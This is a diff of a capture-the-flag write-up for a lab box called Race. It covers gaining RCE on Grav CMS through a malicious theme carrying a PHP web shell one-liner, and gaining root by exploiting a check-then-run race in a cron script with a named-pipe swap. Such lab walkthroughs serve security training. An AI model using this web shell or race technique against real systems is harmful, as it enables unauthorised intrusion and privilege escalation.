@@ -15,7 +15,7 @@ tags:
   - CMS-Grav-Data-Leak
   - SSH-login-error
   - Linux-Privilege-Escalation-directory-ownership-error
-lastmod: 2026-03-29T08:25:45.396Z
+lastmod: 2026-04-03T16:56:35.265Z
 ---
 # Box Info
 
@@ -56,7 +56,7 @@ Nmap done: 1 IP address (1 host up) scanned in 15.34 seconds
 
 ### Tech stack
 
-The website is teched by the Grav and Apache
+The website is created by the Grav and Apache
 
 ![Pasted image 20260228124400.png](/ob/Pasted%20image%2020260228124400.png)
 
@@ -80,7 +80,7 @@ Content-Type: text/html;charset=UTF-8
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "Directory-Brute-Force-Feroxbuster-n" >}} feroxbuster run with `-n` to not recurse for avoiding finding a *ton* of stuff in there .
+{{< tag "Directory-Brute-Force-Feroxbuster" >}} feroxbuster run with -n to not recurse for avoiding finding a *ton* of stuff in there .
 
 {{< /toggle >}}
 
@@ -240,7 +240,8 @@ paste in your  `http://yourip/racers/admin/reset/u/patrick/99dbabf226PleaseChnag
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "CMS-Grav-RCE" >}} Login the Grav CMS with previous data leak with the account upgarde ,After login , the function of theme install in avaible which is allow me to do the Man-In-the-medium-attack to modify the theme as the malicious theme to have the RCE\
+{{< tag "CMS-Grav-RCE" >}} Login the Grav CMS with previous data leak with the account upgarde ,After login , the function of theme install in avaible which is allow me to do the Man-In-the-medium-attack to modify the theme as the malicious theme to have the RCE
+
 {{< /toggle >}}
 
 Check List
@@ -272,10 +273,8 @@ echo '<?php echo system($_GET[0]); ?>' > grav-theme-photographer/img/cmd.php
 zip -r pwn.zip grav-theme-photographer
 ```
 
-We can see that we are allowed to install themes and plugins, we can clone a simple theme (grav\
-theme photographer) and add malicious PHP code that can help us gain a reverse shell.\
-However, the box does not have an internet connection, so to install any plugins/themes, we\
-must do so via a proxy.
+We can see that we are allowed to install themes and plugins, we can clone a simple theme (grav theme photographer) and add malicious PHP code that can help us gain a reverse shell.\
+However, the box does not have an internet connection, so to install any plugins/themes, we must do so via a proxy.
 
 Open the burpsuite to do the setting for the listening all interfaces.
 
@@ -448,7 +447,9 @@ max@race:~$
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "Linux-Privilege-Escalation-directory-ownership-error" >}} After running the pspy to know that  the offsite-backup.sh  will run in every 30 second ,but max has ownership over this directory and the scripts in it, so I remove the old script , and create the pipe and use the tee to input the rev shell to have the shell
+{{< tag "Linux-Privilege-Escalation-directory-ownership-error" >}} After running the pspy to know that  the offsite-backup.sh will run in every 30 second ,but max has ownership over this directory and the scripts in it, so I remove the old script , and create the pipe and use the tee to input the rev shell to have the shell,using a named pipe to intentionally freeze the script, the attacker turns a highly difficult, timing-based race condition into a 100% reliable privilege escalation to `root`.
+
+{{< /toggle >}}
 
 {{< mindmap >}}
 
@@ -464,8 +465,7 @@ max@race:~$
 
 # root
 
-{{< /mindmap >}}\
-{{< /toggle >}}
+{{< /mindmap >}}
 
 ### PSPY
 
@@ -520,40 +520,60 @@ The offsite-backup.sh, secure-cron-runner.sh ,offsite-backup.sh will every 30 mi
 
 ### Cron
 
-```
-max@race:~$ cat  /usr/local/bin/secure-cron-runner.sh
-#!/usr/bin/bash
+/usr/local/bin/secure-cron-runner.sh
+
+{{< code >}}\
+\#!/usr/bin/bash
 
 ## If scripts need environment variables put them into below file
+
 ## so that no one can see them.
+
 . /root/conf/secure-cron-runner.env
 
-declare -a scripts
+declare -a scripts\
 declare -a sigs
 
 ## 0 = offsite-backup by max
-scripts[0]="/usr/local/share/race-scripts/offsite-backup.sh"
-sigs[0]="d15804b944b40ca8540d37ed6bd80906"
-## add other scripts below
-# scripts[1]="<path-to-script>"
-# sigs[1]="<md5sum>"
-# scripts[2]="<path-to-script>"
-# sigs[2]="<md5sum>"
 
-elems=${#scripts[@]}
+scripts\[0]="/usr/local/share/race-scripts/offsite-backup.sh"\
+sigs\[0]="d15804b944b40ca8540d37ed6bd80906"
+
+## add other scripts below
+
+# scripts\[1]="<path-to-script>"
+
+# sigs\[1]="<md5sum>"
+
+# scripts\[2]="<path-to-script>"
+
+# sigs\[2]="<md5sum>"
+
+elems=\${#scripts\[@]}
 
 for (( j=0; j<${elems}; j++ )) ; do
   sig=$(/usr/bin/md5sum ${scripts[$j]} | awk '{print $1}')
-  if [[ "x$sig" == "x${sigs[$j]}" ]] ; then
-    # echo "Script is safe. Running it." >> /var/log/secure-cron-runner.log
-    ${scripts[$j]}
-  else
-    # echo "Script is not safe. Skipping it. Please contact patrick to update signature." >> /var/log/secure-cron-runner.log
-    :
-  fi
-done
+  if [[ "x$sig" == "x${sigs[$j]}" ]] ; then\
+\# echo "Script is safe. Running it." >> /var/log/secure-cron-runner.log\
+${scripts[$j]}\
+else\
+\# echo "Script is not safe. Skipping it. Please contact patrick to update signature." >> /var/log/secure-cron-runner.log\
+:\
+fi\
+done\
+{{< /code >}}
 
-```
+This script makes a fatal assumption: that the file verified by `md5sum` is the **exact same file** that gets executed milliseconds later. Because the script is stored in `/usr/local/share/race-scripts/` (a directory the unprivileged user `max` apparently has write access to), an attacker can swap the file out from under the script between the "Check" (`md5sum`) and the "Use" (Execution).
+
+A root cron job calculates the MD5 hash of a script (The Check) and then executes it (The Use). Because these are two separate steps, there is a tiny window of time where the file can be swapped.
+
+**The Pause:** The attacker replaces the target script (`offsite-backup.sh`) with a **named pipe**. When the root cron job tries to check the file's hash, it reads the empty pipe and **freezes**, waiting for data.
+
+**The Swap:** With the cron job permanently paused at the "Check" phase, the attacker renames the pipe to move it out of the way. They then create a new, malicious script (which drops a root shell) at the original file path.
+
+**The Bypass:** The attacker feeds the contents of the *legitimate* script into the renamed pipe.
+
+**The Execution:** The frozen root process receives the legitimate data, calculates the correct hash, and passes the security check. It then moves to the "Use" phase and executes the file path—which now points to the attacker's malicious payload.
 
 ```
 max@race:/usr/local/share/race-scripts$ mv offsite-backup.sh pipe
